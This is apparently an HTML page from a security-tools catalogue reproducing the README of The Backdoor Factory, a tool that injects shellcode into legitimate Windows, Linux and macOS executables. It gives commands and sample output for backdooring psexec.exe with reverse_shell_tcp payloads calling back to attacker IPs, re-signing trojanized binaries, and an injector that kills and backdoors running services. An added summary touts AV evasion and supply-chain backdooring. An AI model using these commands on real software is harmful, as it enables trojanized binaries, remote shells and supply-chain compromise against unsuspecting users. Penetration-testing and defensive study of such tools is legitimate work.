@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel - Breachcraft Dev</title>
+<meta name="description" content="WARNING: Pull Requests WILL BE IGNORED AND CLOSED">
+<link rel="canonical" href="https://breachcraft.dev/tools/the-backdoor-factory/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel</p>
+  <h1>The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel</h1>
+  <p class="lede">WARNING: Pull Requests WILL BE IGNORED AND CLOSED</p>
+  <h2>What it is</h2>
+<h2>WARNING: Pull Requests WILL BE IGNORED AND CLOSED.</h2>
+<h3>The Backdoor Factory (BDF)</h3>
+<p>For security professionals and researchers only.</p>
+<p>The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.</p>
+<p>Black Hat USA 2015:</p>
+<p>Video: <a href="https://www.youtube.com/watch?v=OuyLzkG16Uk">https://www.youtube.com/watch?v=OuyLzkG16Uk</a></p>
+<p>Paper: <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf</a></p>
+<p>Shmoocon 2015:</p>
+<p>Video: <a href="https://archive.org/details/joshpitts_shmoocon2015">https://archive.org/details/joshpitts_shmoocon2015</a></p>
+<p>Paper: <a href="https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf">https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf</a></p>
+<p>DerbyCon 2014:</p>
+<p>Video: <a href="http://www.youtube.com/watch?v=LjUN9MACaTs">http://www.youtube.com/watch?v=LjUN9MACaTs</a></p>
+<p>DerbyCon 2013:</p>
+<p>Video: <a href="http://www.youtube.com/watch?v=jXLb2RNX5xs">http://www.youtube.com/watch?v=jXLb2RNX5xs</a></p>
+<p>Injection Module Demo: <a href="http://www.youtube.com/watch?v=04aJAex2o3U">http://www.youtube.com/watch?v=04aJAex2o3U</a></p>
+<p>Slides: <a href="http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory">http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory</a></p>
+<p>Contact the developer on:</p>
+<p>IRC: irc.freenode.net #BDFactory</p>
+<p>Twitter: @midnite_runr</p>
+<p>Under a BSD 3 Clause License</p>
+<p>See the wiki: <a href="https://github.com/secretsquirrel/the-backdoor-factory/wiki">https://github.com/secretsquirrel/the-backdoor-factory/wiki</a></p>
+<h3>Installing</h3>
+<h4>DOCKER</h4>
+<pre><code>docker pull secretsquirrel/the-backdoor-factory
+docker run -it secretsquirrel/the-backdoor-factory bash
+# ./backdoor.py</code></pre>
+<p>###OLD SCHOOL</p>
+<p>####Dependences #####<em>To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.</em></p>
+<p><a href="http://www.capstone-engine.org">Capstone engine</a> can be installed from PyPi with:</p>
+<p>sudo pip install capstone</p>
+<p>Pefile, most recent:</p>
+<p><a href="https://code.google.com/p/pefile/">https://code.google.com/p/pefile/</a></p>
+<p>osslsigncode (included in repo):</p>
+<p><a href="http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/">http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/</a></p>
+<p>Kali Install:</p>
+<p>apt-get update apt-get install backdoor-factory</p>
+<p>Other *NIX/MAC INSTALL:</p>
+<p>./install.sh</p>
+<p>This will install Capstone with 3.01 pip to install pefile.</p>
+<p>UPDATE:</p>
+<p>./update.sh</p>
+<p>Supporting:</p>
+<p>Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), and Mach-O x86/x64 and those formats in FAT files</p>
+<p>Packed Files: PE UPX x86/x64</p>
+<p>Experimental: OpenBSD x32</p>
+<p>Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.</p>
+<p>Many thanks to Ryan O'Neill --ryan 'at' codeslum &lt;d ot&gt; org-- Without him, I would still be trying to do stupid things with the elf format. Also thanks to Silvio Cesare with his 1998 paper (<a href="http://vxheaven.org/lib/vsc01.html">http://vxheaven.org/lib/vsc01.html</a>) which these ELF patching techniques are based on.</p>
+<p>Recently tested on many binaries. ---</p>
+<p>./backdoor.py -h Usage: backdoor.py [options]</p>
+<p>##Features:</p>
+<p>###PE Files</p>
+<p>Can find all codecaves in an EXE/DLL. By default, clears the pointer to the PE certificate table, thereby unsigning a binary. Can inject shellcode into code caves or into a new section. Can find if a PE binary needs to run with elevated privileges. When selecting code caves, you can use the following commands: -Jump (j), for code cave jumping -Single (s), for patching all your shellcode into one cave -Append (a), for creating a code cave -Ignore (i or q), nevermind, ignore this binary Can ignore DLLs Import Table Patching AutoPatching (-m automtic) Onionduke (-m onionduke)</p>
+<p>###ELF Files</p>
+<p>Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.</p>
+<p>###Mach-O Files Pre-Text Section patching and signature removal</p>
+<p>###Overall</p>
+<p>The user can : -Provide custom shellcode. -Patch a directory of executables/dlls. -Select x32 or x64 binaries to patch only. -Include BDF is other python projects see pebin.py and elfbin.py</p>
+<p>Sample Usage: ---</p>
+<p>###Patch an exe/dll using an existing code cave:</p>
+<p>./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp</p>
+<p>[<em>] In the backdoor module [</em>] Checking if binary is supported [<em>] Gathering file info [</em>] Reading win32 entry instructions [<em>] Looking for and setting selected shellcode [</em>] Creating win32 resume execution stub [<em>] Looking for caves that will fit the minimum shellcode length of 402 [</em>] All caves lengths:  (402,) ############################################################ The following caves can be used to inject code and possibly continue execution. <strong>Don't like what you see? Use jump, single, append, or ignore.</strong> ############################################################ [<em>] Cave 1 length as int: 402 [</em>] Available caves:</p>
+<ol>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e4d5 End: 0x2e6d0; Cave Size: 507</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e6e9 End: 0x2e8d5; Cave Size: 492</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e8e3 End: 0x2ead8; Cave Size: 501</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eaf1 End: 0x2ecdd; Cave Size: 492</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2ece7 End: 0x2eee0; Cave Size: 505</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eef3 End: 0x2f0e5; Cave Size: 498</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f0fb End: 0x2f2ea; Cave Size: 495</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f2ff End: 0x2f4f8; Cave Size: 505</li>
+<li>Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f571 End: 0x2f7a0; Cave Size: 559</li>
+<li>Section Name: .rsrc; Section Begin: 0x30600 End: 0x5f200; Cave begin: 0x5b239 End: 0x5b468; Cave Size: 559</li>
+</ol>
+<p>[!] Enter your selection: 5 Using selection: 5 [<em>] Changing Section Flags [</em>] Patching initial entry instructions [<em>] Creating win32 resume execution stub [</em>] Overwriting certificate table pointer [*] psexec.exe backdooring complete File psexec.exe is in the 'backdoored' directory</p>
+<p>###Patch an exe/dll by adding a code section:</p>
+<p>./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a [<em>] In the backdoor module [</em>] Checking if binary is supported [<em>] Gathering file info [</em>] Reading win32 entry instructions [<em>] Looking for and setting selected shellcode [</em>] Creating win32 resume execution stub [*] Creating Code Cave</p>
+<ul>
+<li>Adding a new section to the exe/dll for shellcode injection</li>
+</ul>
+<p>[<em>] Patching initial entry instructions [</em>] Creating win32 resume execution stub [<em>] Overwriting certificate table pointer [</em>] psexec.exe backdooring complete File psexec.exe is in the 'backdoored' directory</p>
+<p>###Patch a directory of exes: ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a ...output too long for README...</p>
+<p>###User supplied shellcode: msfpayload windows/exec CMD='calc.exe' R &gt; calc.bin ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.</p>
+<p>###PEcodeSigning</p>
+<p>BDF can sign PE files if you have a codesigning cert. It uses osslsigncode. Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post: <a href="http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html">http://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html</a></p>
+<p>Put your private key password in a file (gasp) as so (exactly as so):</p>
+<p>echo -n yourpassword &gt; certs/passFile.txt</p>
+<p>Name your certs EXACTLY as follows:</p>
+<p>signingCert.cer =&gt; certs/signingCert.cer signingPrivateKey.pem =&gt; certs/signingPrivateKey.pem</p>
+<p>Your certs/ directory should look excatly as so:</p>
+<p>certs ├── passFile.txt ├── signingPrivateKey.pem └── signingCert.cer</p>
+<p>Enable PE Code Signing with the -C flag as so:</p>
+<p>./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C</p>
+<p>On successful run you should see this line in BDF output:</p>
+<p>[*] Code Signing Succeeded</p>
+<p>###Hunt and backdoor: Injector | Windows Only The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service. Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.</p>
+<p>./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow</p>
+<p>###Changelog</p>
+<p>####01/11/2016</p>
+<ul>
+<li>Fix entry point truncation bug that led to improper recovery in rare instances</li>
+</ul>
+<p>####07/04/2016</p>
+<ul>
+<li>Support for dynamic paths in BDFProxy for preprocessor</li>
+</ul>
+<p>####06/19/2016</p>
+<ul>
+<li>Added the preprocessor and other optimizations</li>
+<li>The preprocessor allows the user to modify the binary prior to payload injection</li>
+<li>Invoke with the -p flag</li>
+<li>See samples in ./preprocessor/</li>
+</ul>
+<p>####12/20/2015</p>
+<ul>
+<li>Added directory paths to BDF to find certs directory.</li>
+</ul>
+<p>####12/18/2015</p>
+<ul>
+<li>Added PE codesiging support.  You must provide your own codesigning cert. See here: <a href="https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning">https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning</a></li>
+</ul>
+<p>####11/17/2015</p>
+<ul>
+<li>Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header</li>
+</ul>
+<p>####11/13/2015</p>
+<ul>
+<li>Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching</li>
+</ul>
+<p>####10/19/2015</p>
+<ul>
+<li>Fixed bug in IAT directory cave assignment that caused BDF crash</li>
+<li>Made the feature optional with -A flag</li>
+</ul>
+<p>####10/13/2015</p>
+<ul>
+<li>Changed the Import Table Directory modifications from adding a new section to using an existing code cave</li>
+</ul>
+<p>####08/12/2015</p>
+<ul>
+<li>Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary</li>
+<li>More for usage with BDFProxy</li>
+</ul>
+<p>Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe</p>
+<p>####08/11/2015</p>
+<ul>
+<li>Stability fix for auto cave selection for rare caves of overlap</li>
+</ul>
+<p>####08/05/2015</p>
+<ul>
+<li>BH USA UPDATES, w00t!</li>
+<li>OnionDuke, use -m onionduke</li>
+<li>Supports user supplied exe's and dll's</li>
+<li>Usage: ./backdoor.py -f originalfile.exe -m onionduke -b pentest.dll/exe </li>
+<li>XP MODE = Prior IAT based payloads did not support XP, Wine, or Windows 98.  If you need to support XP use the -X flag. I'm not supporting anything less than XP (and not XP x64).</li>
+<li>Invoke UAC prompt to runas as admin. <em>experimental</em> - patches the PE manifest if requestedExecutionLevel exists.</li>
+<li>Stability updates:</li>
+<li>Fixed a bug with incorrect RVA calculation jmp'ing across 2+ code caves </li>
+<li>Better checks to determine if a new section for the IAT will write into appended data and therefore fail</li>
+<li>Speed Improvements:</li>
+<li>Faster code cave finding while using <em>automatic</em> mode (-m automatic)</li>
+<li>Faster rsrc parsing to find manifest file </li>
+</ul>
+<p>####5/01/2015</p>
+<ul>
+<li>Bug fix to the reverse_tcp_stager_threaded payload when using single caves payload</li>
+</ul>
+<p>####4/28/2015</p>
+<ul>
+<li>Adding check for Bound Imports (PE files with bound imports will not be patched)</li>
+</ul>
+<p>####4/14/2015</p>
+<p>So many updates:</p>
+<ul>
+<li>Automatic patching for PE files (use -m automatic with a *_threaded payload)</li>
+</ul>
+<ul>
+<li>New IAT payloads for x86/x64 PE files</li>
+</ul>
+<ul>
+<li>Just watch: <a href="https://www.youtube.com/watch?v=kkLI_ur6BxY">https://www.youtube.com/watch?v=kkLI_ur6BxY</a></li>
+</ul>
+<p>####2/14/2015 I &lt;3 you guys</p>
+<ul>
+<li>Added Import Address Table patching for PEs to support iat_reverse_tcp payloads that </li>
+</ul>
+<p>use the import table for winAPI calls. If the binary you are patching does not have LoadLibraryA and GetProcAddress, for example, BDF will patch it in to a new Import Table in a new section. Supports x64/x86 PEs.</p>
+<ul>
+<li>Added iat_reverse_tcp for x64 PEs.</li>
+</ul>
+<ul>
+<li>Bug fixes and improvements</li>
+</ul>
+<p>####1/1/2015</p>
+<p>Happy New Year!</p>
+<p>Two new OS X payloads! The delay: delay_reverse_shell_tcp</p>
+<p>-B 30 --&gt; delay the payload for 30 seconds, main code runs right away.</p>
+<p>Setting of firm capstone commit for building into BDF, capstone 'Next' repo breaks BDF.</p>
+<p>Fixes to support cython capstone implementation null byte truncation issue</p>
+<p>####12/27/2014</p>
+<p>Added payloadtests.py</p>
+<p>This script will output patched files in backdoored that will allow for the user to test the payloads as they wish. Each payload type increments the port used by one.</p>
+<p>Usage: payloadtest.py binary HOST PORT</p>
+<p>####12/17/2014</p>
+<p>OS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp</p>
+<p>-B 15  --&gt; set beacon time for 15 secs</p>
+<p>Bug fix to support OS X for BDFProxy</p>
+<p>####10/11/2014</p>
+<p>PE UPX Patching Added</p>
+<p>####9/26/2014</p>
+<p>Mach-O x86/x64 added</p>
+<p>x86 IAT payload optimization</p>
+<p>####7/31/2014</p>
+<p>Added support for ARM x32 LE ELF patching</p>
+<p>####7/22/2014</p>
+<p>Added FreeBSD x32 ELF patching support</p>
+<p>Change to BSD 3 Clause License</p>
+<p>####7/13/2014</p>
+<p>Incorporated Capstone: <a href="http://www.capstone-engine.org/">http://www.capstone-engine.org/</a></p>
+<p>During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.</p>
+<p>Renamed loadliba_reverse_tcp to iat_reverse_tcp.</p>
+<p>Small optimizations for speed.</p>
+<p>####5/30/2014</p>
+<p>Added a new win86 shellcode: loadliba_reverse_tcp</p>
+<ul>
+<li>Based on the following research by Jared DeMott: <a href="http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf">http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf</a> -- Thanks @bannedit0 for mentioning this.</li>
+<li>This shellcode uses LoadLibraryA and GetProcAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).</li>
+<li>It's not stealthy. It's position dependent. But the results are great (code cave jumping): <a href="https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/">https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/</a></li>
+<li>Bypasses EMET 4.1. The caller protection doesn't catch it.</li>
+<li>As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.</li>
+</ul>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> Python Tool</li><li><strong>Purpose</strong> Patch executables with shellcode</li><li><strong>Platform</strong> Linux</li><li><strong>Tags</strong> #backdooring #shellcode #executables #post-exploitation</li></ul>
+<h3>Purpose</h3>
+<p>Backdoor Factory patches legitimate executables:</p>
+<ul>
+<li>Injects shellcode</li>
+<li>Maintains functionality</li>
+<li>Evades basic detection</li>
+<li>Creates backdoored binaries</li>
+</ul>
+<h3>Installation</h3>
+<pre><code>git clone https://github.com/secretsquirrel/the-backdoor-factory.git
+cd the-backdoor-factory
+pip install -r requirements.txt</code></pre>
+<h3>Usage</h3>
+<pre><code># Basic backdooring
+./backdoor.py -f target.exe -s reverse_shell_tcp_inline -H 10.10.10.10 -P 4444
+
+# Patch binary
+./backdoor.py -f legitimate.exe -s &lt;shellcode&gt;
+
+# Output backdoored file</code></pre>
+<h3>Shellcode Options</h3>
+<ul>
+<li>Reverse shells</li>
+<li>Bind shells</li>
+<li>User add</li>
+<li>Custom shellcode</li>
+</ul>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Binary Patching</strong>: Injects without breaking functionality 💡 <strong>AV Evasion</strong>: May evade signature-based detection 💡 <strong>Supply Chain</strong>: Can backdoor legitimate software 💡 <strong>Code Signing</strong>: Breaks signatures (will need re-signing)</p>
+<h3>Note</h3>
+<p>General post-exploitation tool, not Azure-specific. Included for comprehensive toolkit coverage.</p>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></li>
+<li>Author: @secretsquirrel</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
